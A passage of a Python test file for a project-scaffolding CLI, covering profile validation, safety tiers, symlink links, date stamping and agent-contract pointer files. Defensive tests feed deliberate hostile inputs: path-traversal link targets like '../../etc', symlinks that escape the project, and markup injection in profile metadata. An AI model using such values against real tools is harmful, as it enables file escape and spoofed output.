    assert profiles.load(root).name == "myteam"
    # Re-running onto an existing dir refuses rather than clobbering.
    assert cli.main(["profile", "init", "myteam", "-o", str(tmp_path)]) == 2


def test_init_harness_files_are_meta_never_scaffolded(tmp_path: Path) -> None:
    # The root-level README.md and the root AGENTS.md *building guide* are meta (not under
    # templates/) — a scaffold never ships them. The profile *does* ship a contract stub at
    # templates/AGENTS.md, declared as agents_contract (RFC 2026-07-07-agents-contract §6):
    # distinct from the building guide, and never confused with it.
    assert cli.main(["profile", "init", "team", "-o", str(tmp_path)]) == 0
    prof = profiles.load(tmp_path / "team")
    shipped = {rel: src for rel, src in prof.template_files()}
    assert "README.md" not in shipped  # meta harness, never shipped
    assert prof.agents_contract == "AGENTS.md" and "AGENTS.md" in shipped  # the contract stub
    # The shipped stub is the contract, NOT the root building-guide harness.
    root_guide = (tmp_path / "team" / "AGENTS.md").read_text(encoding="utf-8")
    stub = shipped["AGENTS.md"].read_text(encoding="utf-8")
    assert "Building the team profile" in root_guide  # the meta guide
    assert "Building the team profile" not in stub  # the contract stub is a different file
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "README.md" not in m["profile"]["files"]  # meta harness never owned
    assert "AGENTS.md" in m["profile"]["files"]  # the contract stub is shipped and owned


def test_profile_init_rejects_the_removed_standalone_flag(tmp_path: Path) -> None:
    # Every profile is the complete setup now — the old mode flag is gone, not ignored.
    with pytest.raises(SystemExit):
        cli.main(["profile", "init", "solo", "-o", str(tmp_path), "--standalone"])


def test_profile_validate_accepts_a_good_profile(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"docs/x.md.j2": "hi {{ project_name }}\n"})
    assert cli.main(["profile", "validate", str(prof.root)]) == 0


def test_profile_validate_flags_an_empty_description(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # The description is what adopters read at scaffold time (the intro panel) and in the
    # community index — validate (and so check-index, transitively) requires it.
    d = tmp_path / "team"
    (d / "templates").mkdir(parents=True)
    (d / "profile.json").write_text(
        json.dumps({"name": "team", "version": "1.0.0"}), encoding="utf-8"
    )
    assert cli.main(["profile", "validate", str(d)]) == 1
    assert "'description' is empty" in capsys.readouterr().out


def test_profile_validate_flags_a_broken_template(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    prof = _make_profile(tmp_path, "team", {"bad.md.j2": "{% if oops %}\n"})  # unclosed if
    assert cli.main(["profile", "validate", str(prof.root)]) == 1
    assert "bad.md" in capsys.readouterr().out  # names the offending template


def test_profile_validate_flags_a_binary_template(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # apply() ships text (UTF-8) — a binary template would crash the consumer's scaffold, so
    # validate must catch it at author time (review of B2).
    prof = _make_profile(tmp_path, "team", {"ok.md": "hi\n"})
    (prof.root / "templates" / "logo.png").write_bytes(b"\x89PNG\x00\xff\xfe")
    assert cli.main(["profile", "validate", str(prof.root)]) == 1
    assert "not UTF-8" in capsys.readouterr().out


def test_apply_refuses_a_binary_template_legibly(tmp_path: Path) -> None:
    # And if an unvalidated profile reaches apply anyway, the failure is a legible
    # ProfileError naming the file — not a raw UnicodeDecodeError mid-scaffold.
    _make_profile(tmp_path, "bin", {"ok.md": "hi\n"})
    (tmp_path / "bin" / "templates" / "logo.png").write_bytes(b"\x89PNG\x00\xff\xfe")
    prof = profiles.load(tmp_path / "bin")
    target = tmp_path / "proj"
    target.mkdir()
    with pytest.raises(profiles.ProfileError, match="not UTF-8"):
        profiles.apply(prof, _config(target), Scaffolder(target), {})


def test_profile_validate_flags_an_undefined_variable_typo(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # Strict rendering catches a typo'd variable that normal scaffolding would leave blank.
    prof = _make_profile(tmp_path, "team", {"x.md.j2": "hi {{ projetc_name }}\n"})
    assert cli.main(["profile", "validate", str(prof.root)]) == 1
    assert "x.md" in capsys.readouterr().out


def test_profile_validate_flags_a_seed_entry_with_no_file(tmp_path: Path) -> None:
    # `seed` names a path the profile doesn't actually ship → likely a typo, caught before a
    # consumer ever scaffolds with it.
    prof = _make_profile(tmp_path, "team", {"real.md": "x\n"}, seed=("ghost.md",))
    assert cli.main(["profile", "validate", str(prof.root)]) == 1


def test_validate_warns_but_passes_when_a_gate_runs_a_tool_with_no_manifest(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # The tolaria-setup blocker: a pre-commit hook runs `pnpm lint` but the profile ships no
    # package.json, so a fresh scaffold can't reach a passing commit. Advisory — exit stays 0.
    prof = _make_profile(
        tmp_path, "team", {".husky/pre-commit": "pnpm lint\n", ".gitignore": "node_modules/\n"}
    )
    assert cli.main(["profile", "validate", str(prof.root)]) == 0
    out = capsys.readouterr().out
    # `hand-authors` is unique to the L3 warning (package.json also appears in the safety line
    # because it's an execution sink, so match the warning-only token instead).
    assert "⚠" in out and "hand-authors" in out


def test_validate_no_manifest_warning_once_the_manifest_ships(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {".husky/pre-commit": "pnpm lint\n", "package.json": "{}\n", ".gitignore": "x\n"},
    )
    assert cli.main(["profile", "validate", str(prof.root)]) == 0
    assert "⚠" not in capsys.readouterr().out  # manifest + .gitignore shipped → no footgun


def test_validate_no_manifest_warning_for_a_conditionally_rendered_gate(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # The flagship-baseline pattern: a .j2 gate whose `cargo` steps render only for a Rust
    # project. The lint scans the *rendered* default output (no Rust → no cargo), not the raw
    # Jinja source, so a well-designed conditional gate isn't a false positive.
    prof = _make_profile(
        tmp_path,
        "team",
        {
            ".github/workflows/quality.yml.j2": (
                "steps:\n{% if answers.use_rust %}  - run: cargo test\n{% endif %}"
            ),
            ".gitignore": "target/\n",
        },
        prompts=[{"name": "use_rust", "type": "confirm", "message": "Rust?", "default": False}],
    )
    assert cli.main(["profile", "validate", str(prof.root)]) == 0
    assert "⚠" not in capsys.readouterr().out  # cargo doesn't render for the default answer


def test_validate_l3_catches_a_run_step_command_with_no_manifest(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # `- run: cargo test` in a workflow is a real command (unwrapped from `run:`, first word
    # `cargo`) — flagged when no Cargo.toml ships.
    prof = _make_profile(
        tmp_path,
        "team",
        {".github/workflows/ci.yml": "steps:\n  - run: cargo test\n", ".gitignore": "x\n"},
    )
    assert cli.main(["profile", "validate", str(prof.root)]) == 0
    out = capsys.readouterr().out
    assert "⚠" in out and "hand-authors" in out


def test_validate_no_l3_warning_on_tool_names_in_prose(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # Runner tokens inside a step `name:`, an `echo`, or a `#` comment are not commands — the lint
    # matches only the first word of a command, so none of these false-positive (review finding).
    prof = _make_profile(
        tmp_path,
        "team",
        {
            ".github/workflows/ci.yml": (
                "steps:\n"
                "  - name: Run the quality task now\n"
                "  - run: echo remember to install pnpm and uv\n"
                "  # cargo is not used here\n"
            ),
            ".gitignore": "x\n",
        },
    )
    assert cli.main(["profile", "validate", str(prof.root)]) == 0
    assert "⚠" not in capsys.readouterr().out


def test_validate_never_crashes_on_a_raising_empty_files_when(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # A when-clause over an undeclared answer *raises* at eval (not falsy). The advisory pass must
    # degrade to no warnings, never propagate a nonzero exit out of validate (review High finding).
    prof = _make_profile(tmp_path, "team", {"docs/x.md": "hi\n"})
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["empty_files"] = {"docs/rfc/active/.gitkeep": "answers.nonexistent > 3"}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    assert cli.main(["profile", "validate", str(prof.root)]) == 0  # no traceback, clean exit


def test_validate_warns_on_a_shipped_local_secret_file(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # A tracked settings.local.json commits the adopter's own approvals (feedback #6).
    prof = _make_profile(tmp_path, "team", {".claude/settings.local.json": "{}\n"})
    assert cli.main(["profile", "validate", str(prof.root)]) == 0
    out = capsys.readouterr().out
    assert "⚠" in out and "per-machine/secret" in out  # warning-only phrase


def test_validate_warns_on_hooks_without_a_gitignore(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # Ships a gate but no .gitignore → a fresh `git add -A` stages deps/secrets (feedback #5).
    prof = _make_profile(tmp_path, "team", {".husky/pre-commit": "echo hi\n"})
    assert cli.main(["profile", "validate", str(prof.root)]) == 0
    out = capsys.readouterr().out
    assert "⚠" in out and ".gitignore" in out  # .gitignore appears only in the L2 warning here


def test_validate_is_quiet_for_a_clean_profile(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    # A docs-only profile trips none of the footgun lints — no ⚠, and .env.example is not secret.
    prof = _make_profile(
        tmp_path, "team", {"docs/x.md.j2": "hi {{ project_name }}\n", ".env.example": "TOKEN=\n"}
    )
    assert cli.main(["profile", "validate", str(prof.root)]) == 0
    assert "⚠" not in capsys.readouterr().out


def test_profile_list_reports_user_dir(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr(profiles, "USER_PROFILE_DIR", tmp_path / "profiles")
    assert cli.main(["profile", "list"]) == 0
    assert "No profiles" in capsys.readouterr().out
    _make_profile(tmp_path / "profiles", "team", {"docs/x.md": "hi\n"})
    assert cli.main(["profile", "list"]) == 0
    assert "team" in capsys.readouterr().out


def test_profile_list_shows_the_safety_tier(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr(profiles, "USER_PROFILE_DIR", tmp_path / "profiles")
    _make_profile(tmp_path / "profiles", "safeone", {"docs/x.md": "hi\n"})  # inert → safe
    _make_profile(
        tmp_path / "profiles", "unsafeone", {"Makefile": "all:\n\techo\n"}
    )  # sink → unsafe
    assert cli.main(["profile", "list"]) == 0
    out = capsys.readouterr().out
    assert "· safe" in out and "· unsafe" in out


def test_profile_show_inspects_without_applying(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    prof = _make_profile(
        tmp_path, "team", {".github/workflows/ci.yml": "on: push\n"}, session_start=("echo hi",)
    )
    assert cli.main(["profile", "show", str(prof.root)]) == 0
    out = capsys.readouterr().out
    assert "team" in out and "unsafe" in out  # name + derived tier
    assert "ci.yml" in out and "echo hi" in out  # files + the hook it would run


def test_profile_show_escapes_untrusted_markup(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    d = tmp_path / "evil"
    (d / "templates").mkdir(parents=True)
    (d / "profile.json").write_text(
        json.dumps(
            {
                "name": "evil",
                "version": "[bold]0wned[/]",  # version is untrusted remote data too
                "description": "[green]VERIFIED[/]",
            }
        ),
        encoding="utf-8",
    )
    (d / "templates/x.md").write_text("hi\n", encoding="utf-8")
    assert cli.main(["profile", "show", str(d)]) == 0
    out = capsys.readouterr().out
    assert "[green]VERIFIED[/]" in out and "[bold]0wned[/]" in out  # both escaped, not styled away


def test_profile_show_default_and_missing(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    assert cli.main(["profile", "show", "default"]) == 0
    assert "legacy bare-generator" in capsys.readouterr().out
    assert cli.main(["profile", "show", str(tmp_path / "nope")]) == 2


def test_load_reads_and_validates_tags(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"docs/x.md": "hi\n"}, tags=("backend", "python"))
    assert prof.tags == ("backend", "python")
    bad = tmp_path / "bad"
    (bad / "templates").mkdir(parents=True)
    (bad / "profile.json").write_text(
        json.dumps({"name": "x", "version": "1.0.0", "tags": "notalist"}),
        encoding="utf-8",
    )
    with pytest.raises(profiles.ProfileError, match="tags"):
        profiles.load(bad)


def test_show_and_publish_surface_tags(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    prof = _make_profile(tmp_path, "team", {"docs/x.md": "hi\n"}, tags=("backend", "design"))
    assert cli.main(["profile", "show", str(prof.root)]) == 0
    assert "backend, design" in capsys.readouterr().out  # show displays them
    assert cli.main(["profile", "publish", str(prof.root)]) == 0
    out = capsys.readouterr().out
    assert '"tags"' in out and '"backend"' in out  # publish carries them into the index entry


def test_scaffold_with_unknown_profile_exits_2(tmp_path: Path) -> None:
    rc = cli.main(["demo", "-o", str(tmp_path / "out"), "-y", "--no-git", "--profile", "nope"])
    assert rc == 2
    assert not (tmp_path / "out" / "AGENTS.md").exists()  # nothing scaffolded on a bad profile


# --- links + @DATE@ (RFC 2026-07-05 §6) --------------------------------------------------------


def test_load_validates_links(tmp_path: Path) -> None:
    d = tmp_path / "p"
    (d / "templates").mkdir(parents=True)

    def manifest(links: object) -> None:
        (d / "profile.json").write_text(
            json.dumps({"name": "p", "version": "1.0.0", "links": links}),
            encoding="utf-8",
        )

    for bad in (["a"], {"a": 1}, {"": "x"}, {"a": ""}):
        manifest(bad)
        with pytest.raises(profiles.ProfileError, match="links"):
            profiles.load(d)
    for escaping in ({"../out": "AGENTS.md"}, {"CLAUDE.md": "../../etc"}, {"/abs": "x"}):
        manifest(escaping)
        with pytest.raises(profiles.ProfileError, match="inside the project"):
            profiles.load(d)
    manifest({"CLAUDE.md": "AGENTS.md", "GEMINI.md": "AGENTS.md"})
    prof = profiles.load(d)
    assert prof.links == (("CLAUDE.md", "AGENTS.md", None), ("GEMINI.md", "AGENTS.md", None))
    # Object form carries a `when`; a bad expression fails at load, not mid-apply.
    manifest({"CLAUDE.md": {"target": "AGENTS.md", "when": '"claude" in answers.tools'}})
    prof = profiles.load(d)
    assert prof.links == (("CLAUDE.md", "AGENTS.md", '"claude" in answers.tools'),)
    manifest({"CLAUDE.md": {"target": "AGENTS.md", "when": "{% bad"}})
    with pytest.raises(profiles.ProfileError, match="not a valid expression"):
        profiles.load(d)
    manifest({"CLAUDE.md": {"when": "x"}})  # object form still requires a target
    with pytest.raises(profiles.ProfileError, match="links"):
        profiles.load(d)


def test_links_are_created_owned_and_classified(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"NOTES.md": "hi\n"})
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["links"] = {"NOTES-LINK.md": "NOTES.md"}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source="team")

    tier, reasons = profiles.classify_safety(prof)
    assert tier == "unsafe" and any("symlink" in r for r in reasons)  # fail-closed

    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    link = target / "NOTES-LINK.md"
    assert link.is_symlink() and link.resolve() == (target / "NOTES.md").resolve()
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "NOTES-LINK.md" in m["profile"]["files"]  # the link is an owned output
    assert m["files"]["NOTES-LINK.md"].startswith("symlink:")  # same provenance as base links

    import argparse

    shown = _Console()
    assert profiles._show(argparse.Namespace(ref=str(prof.root)), shown) == 0
    assert "NOTES-LINK.md -> NOTES.md" in shown.text


def test_link_through_symlinked_parent_is_refused(tmp_path: Path) -> None:
    # Confinement: a symlink dir already in the target must not let a link land outside.
    prof = _make_profile(tmp_path, "team", {})
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["links"] = {"sub/evil.md": "sub/x.md"}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source="team")
    target = tmp_path / "proj"
    target.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    (target / "sub").symlink_to(outside)
    with pytest.raises(profiles.ProfileError, match="escapes the project"):
        profiles.apply(prof, _config(target), Scaffolder(target), {})


def test_date_token_substitutes_and_replays_on_update(tmp_path: Path) -> None:
    from datetime import date

    prof = _make_profile(
        tmp_path, "team", {"docs/@DATE@-note.md": "v1\n"}, version="0.1.0", by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    today = f"{date.today():%Y-%m-%d}"
    dated = target / "docs" / f"{today}-note.md"
    assert dated.read_text(encoding="utf-8") == "v1\n"
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["date"] == today
    _commit(target)

    # Simulate the recorded date being older than "today" at update time: rewrite it and move
    # the file — update must replay the RECORDED stamp, not restamp with its own today.
    old_day = "2020-01-01"
    m["profile"]["date"] = old_day
    m["profile"]["files"] = [f"docs/{old_day}-note.md"]
    m["files"][f"docs/{old_day}-note.md"] = m["files"].pop(f"docs/{today}-note.md")
    (target / MANIFEST_PATH).write_text(json.dumps(m, indent=2), encoding="utf-8")
    dated.rename(target / "docs" / f"{old_day}-note.md")
    _commit(target)

    _bump_profile(prof.root, version="0.1.2", files={"docs/@DATE@-note.md": "v2\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "docs" / f"{old_day}-note.md").read_text(encoding="utf-8") == "v2\n"
    assert not (target / "docs" / f"{today}-note.md").exists()  # no drift, no duplicate
    m2 = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m2["profile"]["date"] == old_day  # the stamp survives the refresh


def test_date_is_always_recorded_and_env_date_replays(tmp_path: Path) -> None:
    # Recorded unconditionally (review of #54): a body-only {{ env.date }} must replay the
    # recorded stamp on update, not re-stamp with update-day.
    prof = _make_profile(
        tmp_path, "team", {"docs/stamped.md.j2": "born {{ env.date }}"}, by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    from datetime import date

    assert m["profile"]["date"] == f"{date.today():%Y-%m-%d}"
    m["profile"]["date"] = "2020-01-01"  # simulate an old scaffold
    stamped = target / "docs" / "stamped.md"
    stamped.write_text("born 2020-01-01", encoding="utf-8")
    m["files"]["docs/stamped.md"] = (
        "sha256:" + __import__("hashlib").sha256(b"born 2020-01-01").hexdigest()
    )
    (target / MANIFEST_PATH).write_text(json.dumps(m, indent=2), encoding="utf-8")
    _commit(target)
    _bump_profile(prof.root, version="1.0.1", files={"docs/other.md": "y\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert stamped.read_text(encoding="utf-8") == "born 2020-01-01"  # replayed, no drift


def test_link_target_resolving_outside_is_refused(tmp_path: Path) -> None:
    # Dest-side confinement: a link TARGET that chains through a user's outward symlink would
    # alias project reads/writes to outside — refused before creation.
    prof = _make_profile(tmp_path, "team", {})
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["links"] = {"CLAUDE.md": "AGENTS.md"}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source="team")
    target = tmp_path / "proj"
    target.mkdir()
    outside = tmp_path / "outside.md"
    outside.write_text("secrets\n", encoding="utf-8")
    (target / "AGENTS.md").symlink_to(outside)  # user's own outward link at the dest
    with pytest.raises(profiles.ProfileError, match="escapes the project"):
        profiles.apply(prof, _config(target), Scaffolder(target), {})


def test_link_over_preexisting_file_folds_the_contract(tmp_path: Path) -> None:
    # The engine fold (RFC 2026-07-05, decided 2026-07-06): the profile ships AGENTS.md and
    # links CLAUDE.md at it — a user's real CLAUDE.md is FOLDED beneath the rendered contract
    # (content preserved, seeded as the user's) and the symlink takes its place. This
    # supersedes the pre-fold behavior (skip the link, leave the file).
    prof = _make_profile(tmp_path, "team", {"AGENTS.md": "contract\n"})
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["links"] = {"CLAUDE.md": "AGENTS.md"}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source="team")
    target = tmp_path / "proj"
    target.mkdir()
    (target / "CLAUDE.md").write_text("the user's own file\n", encoding="utf-8")
    owned = profiles.apply(prof, _config(target), Scaffolder(target), {})
    agents_md = (target / "AGENTS.md").read_text(encoding="utf-8")
    assert agents_md.startswith("contract")
    assert "Preserved from your original CLAUDE.md" in agents_md
    assert "the user's own file" in agents_md  # nothing lost
    assert (target / "CLAUDE.md").is_symlink()  # the link took the file's place
    assert "AGENTS.md" in owned and "CLAUDE.md" in owned


def test_fold_preserves_a_preexisting_contract_itself(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"AGENTS.md": "new contract\n"})
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["links"] = {"CLAUDE.md": "AGENTS.md"}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source="team")
    target = tmp_path / "proj"
    target.mkdir()
    (target / "AGENTS.md").write_text("the team's old rules\n", encoding="utf-8")
    sc = Scaffolder(target)
    profiles.apply(prof, _config(target), sc, {})
    merged = (target / "AGENTS.md").read_text(encoding="utf-8")
    assert merged.startswith("new contract") and "the team's old rules" in merged
    assert "AGENTS.md" in sc.seed  # the folded contract is the user's — never refreshed


# --- agents_contract (RFC 2026-07-07-agents-contract) ---------------------------------------


def test_agents_contract_load_validation(tmp_path: Path) -> None:
    d = tmp_path / "p"
    (d / "templates").mkdir(parents=True)
    (d / "templates" / "AGENTS.md").write_text("c\n", encoding="utf-8")

    def manifest(contract: object) -> None:
        (d / "profile.json").write_text(
            json.dumps(
                {"name": "p", "version": "1.0.0", "description": "x", "agents_contract": contract}
            ),
            encoding="utf-8",
        )

    for bad in (1, "", "../x.md", "/abs.md", "a/@DATE@.md"):
        manifest(bad)
        with pytest.raises(profiles.ProfileError, match="agents_contract"):
            profiles.load(d)
    # A contract the profile doesn't ship has nothing to point at — rejected at load.
    manifest("MISSING.md")
    with pytest.raises(profiles.ProfileError, match="doesn't match any file"):
        profiles.load(d)
    manifest("AGENTS.md")  # shipped → accepted
    assert profiles.load(d).agents_contract == "AGENTS.md"


def test_agents_contract_expands_to_pointers_stays_safe_and_recorded(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"AGENTS.md": "contract\n"}, agents_contract="AGENTS.md")
    # A profile whose only "link" is the declared contract still earns `safe` — the engine
    # pointers are provably inert and excluded from the fail-closed links rule.
    assert profiles.classify_safety(prof)[0] == "safe"
    # The contract file is never pointed at itself; every other pointer targets it.
    assert prof.contract_pointers() == (("CLAUDE.md", "AGENTS.md"), ("GEMINI.md", "AGENTS.md"))

    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    assert (target / "AGENTS.md").is_file() and not (target / "AGENTS.md").is_symlink()
    for name in ("CLAUDE.md", "GEMINI.md"):
        link = target / name
        assert link.is_symlink() and link.resolve() == (target / "AGENTS.md").resolve()
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    owned = m["profile"]["files"]
    assert {"AGENTS.md", "CLAUDE.md", "GEMINI.md"} <= set(owned)
    assert m["files"]["CLAUDE.md"] == "symlink:AGENTS.md"


def test_agents_contract_folds_preexisting_contract_and_pointer_files(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"AGENTS.md": "new\n"}, agents_contract="AGENTS.md")
    target = tmp_path / "proj"
    target.mkdir()
    (target / "AGENTS.md").write_text("old rules\n", encoding="utf-8")
    (target / "CLAUDE.md").write_text("claude notes\n", encoding="utf-8")
    sc = Scaffolder(target)
    profiles.apply(prof, _config(target), sc, {})
    merged = (target / "AGENTS.md").read_text(encoding="utf-8")
    assert merged.startswith("new")
    assert "old rules" in merged and "claude notes" in merged  # both folded, nothing lost
    assert (target / "CLAUDE.md").is_symlink() and (target / "GEMINI.md").is_symlink()
    assert "AGENTS.md" in sc.seed  # the folded contract is the user's — never refreshed


def test_agents_contract_yields_to_profile_owned_and_declared_pointers(tmp_path: Path) -> None:
    # A pointer path the profile ships a file at (CLAUDE.md) or declares its own link for
    # (GEMINI.md) is the author's — the engine skips generating that pointer.
    prof = _make_profile(
        tmp_path,
        "team",
        {"AGENTS.md": "c\n", "CLAUDE.md": "my own claude file\n"},
        agents_contract="AGENTS.md",
    )
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["links"] = {"GEMINI.md": "docs/other.md"}
    (prof.root / "templates" / "docs").mkdir(parents=True)
    (prof.root / "templates" / "docs" / "other.md").write_text("o\n", encoding="utf-8")
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source="team")
    # Neither CLAUDE.md (shipped) nor GEMINI.md (author-linked) is an engine pointer.
    assert prof.contract_pointers() == ()

    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    assert (target / "CLAUDE.md").read_text(encoding="utf-8") == "my own claude file\n"
    assert (target / "GEMINI.md").resolve() == (target / "docs/other.md").resolve()


def test_agents_contract_subdir_points_from_root_and_never_self_points(tmp_path: Path) -> None:
    # A contract in a subdirectory gets root-level pointers; a contract *named* like a pointer
    # (CLAUDE.md) never points at itself.
    sub = _make_profile(
        tmp_path / "a", "team", {"docs/AGENTS.md": "c\n"}, agents_contract="docs/AGENTS.md"
    )
    assert sub.contract_pointers() == (
        ("AGENTS.md", "docs/AGENTS.md"),
        ("CLAUDE.md", "docs/AGENTS.md"),
        ("GEMINI.md", "docs/AGENTS.md"),
    )
    named = _make_profile(tmp_path / "b", "team", {"CLAUDE.md": "c\n"}, agents_contract="CLAUDE.md")
    assert named.contract_pointers() == (
        ("AGENTS.md", "CLAUDE.md"),
        ("GEMINI.md", "CLAUDE.md"),
    )


def test_named_profile_senses_existing_project_regardless_of_languages_flag(
    tmp_path: Path,
) -> None:
    # env.existing_project must sense pre-existing source from what's actually in the target,
    # not from the engine --languages *choice* (which a named profile never sees). A regression
    # here made `--profile X --languages python` over a python repo read existing_project=False.
    body = "{% if env.existing_project %}brownfield{% else %}greenfield{% endif %}\n"
    prof = _make_profile(
        tmp_path, "team", {"AGENTS.md.j2": body}, agents_contract="AGENTS.md", by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    (target / "main.py").write_text("print(1)\n", encoding="utf-8")  # pre-existing python source
    rc = cli.main(
        [
            "demo",
            "-o",
            str(target),
            "-y",
            "--no-git",
            "--languages",
            "python",
            "--profile",
            str(prof.root),
        ]
    )
    assert rc == 0
    assert (target / "AGENTS.md").read_text(encoding="utf-8").startswith("brownfield")


def test_derive_tools(tmp_path: Path) -> None:
    # A declared contract targets every assistant (universal by construction).
    contract = _make_profile(tmp_path / "a", "t", {"AGENTS.md": "c\n"}, agents_contract="AGENTS.md")
    assert profiles.derive_tools(contract) == list(AI_TOOLS)
    # Otherwise a tool is targeted iff the profile ships under its surface.
    surfaced = _make_profile(
        tmp_path / "b",
        "t",
        {".cursor/rules/x.mdc": "x", ".github/prompts/y.prompt.md": "y"},
    )
    assert profiles.derive_tools(surfaced) == ["cursor", "copilot"]
    # session_start (Claude-only hooks) targets Claude; a bare profile targets nothing.
    hooks = _make_profile(tmp_path / "c", "t", {}, session_start=("echo x",))
    assert profiles.derive_tools(hooks) == ["claude"]
    assert profiles.derive_tools(_make_profile(tmp_path / "d", "t", {"NOTES.md": "n"})) == []


def test_grown_pointer_matrix_retrofits_on_update(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # The headline mechanic (RFC 2026-07-07-agents-contract §2): a pointer added to the engine
    # matrix retrofits an already-scaffolded project on its next update — no profile bump.
    prof = _make_profile(
        tmp_path, "team", {"AGENTS.md": "c\n"}, agents_contract="AGENTS.md", by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    # Scaffold under a SHRUNKEN matrix (pretend GEMINI.md didn't exist yet).
    monkeypatch.setattr(profiles, "AGENT_POINTERS", ("AGENTS.md", "CLAUDE.md"))
    cli.build(_config(target), Scaffolder(target), prof)
    assert (target / "CLAUDE.md").is_symlink() and not (target / "GEMINI.md").exists()
    _commit(target)
    # The matrix grows; update re-applies and creates the new pointer where the path is free.
    monkeypatch.setattr(profiles, "AGENT_POINTERS", ("AGENTS.md", "CLAUDE.md", "GEMINI.md"))
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "GEMINI.md").is_symlink()
    assert (target / "GEMINI.md").resolve() == (target / "AGENTS.md").resolve()


def test_grown_pointer_over_a_user_file_is_a_conflict_not_a_clobber(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    prof = _make_profile(
        tmp_path, "team", {"AGENTS.md": "c\n"}, agents_contract="AGENTS.md", by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    monkeypatch.setattr(profiles, "AGENT_POINTERS", ("AGENTS.md", "CLAUDE.md"))
    cli.build(_config(target), Scaffolder(target), prof)
    (target / "GEMINI.md").write_text("my own gemini file\n", encoding="utf-8")
    _commit(target)
    monkeypatch.setattr(profiles, "AGENT_POINTERS", ("AGENTS.md", "CLAUDE.md", "GEMINI.md"))
    assert update.run(target, dry_run=False, console=_Console()) == 0
    # Never folded, never clobbered at update — the user's file stands, reported as a conflict.
    assert (target / "GEMINI.md").read_text(encoding="utf-8") == "my own gemini file\n"
    assert not (target / "GEMINI.md").is_symlink()


def test_dated_seed_entry_stays_write_once(tmp_path: Path) -> None:
    # seed entries substitute @DATE@ too — a regression flips the dated file to managed and a
    # later update would refresh the write-once file it exists to protect.
    prof = _make_profile(
        tmp_path,
        "team",
        {"docs/@DATE@-charter.md": "v1\n"},
        version="0.1.0",
        seed=("docs/@DATE@-charter.md",),
        by_path=True,
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    from datetime import date

